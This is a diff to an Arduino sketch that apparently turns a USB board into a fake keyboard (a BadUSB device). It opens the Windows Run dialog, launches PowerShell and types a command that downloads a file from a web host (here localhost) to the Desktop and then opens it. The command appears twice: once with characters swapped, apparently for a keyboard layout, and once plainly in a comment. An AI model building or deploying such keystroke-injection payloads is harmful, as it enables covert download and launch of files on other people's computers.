@@ -44,9 +44,12 @@ void setup() {
   Keyboard.press('r');
   Keyboard.releaseAll();  
   delay(100);
-  Keyboard.println("cmd");
-
-  delay(500);
+  Keyboard.println("powershell");
+  delay(100);
+  Keyboard.println("*New/Object System.Net.WebClient(.DownloadFile*@http>&&localhost&CodePNG.png@, @$*$Env>userprofile(&Desktop&CodePNG.png@(");
+  Keyboard.println("Invoke/item $Env>userprofile&Desktop&CodePNG.png");
+  /*Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
+  Keyboard.println("Invoke-item $Env:userprofile/Desktop/CodePNG.png"); */
   Keyboard.releaseAll();
   
   Keyboard.end();
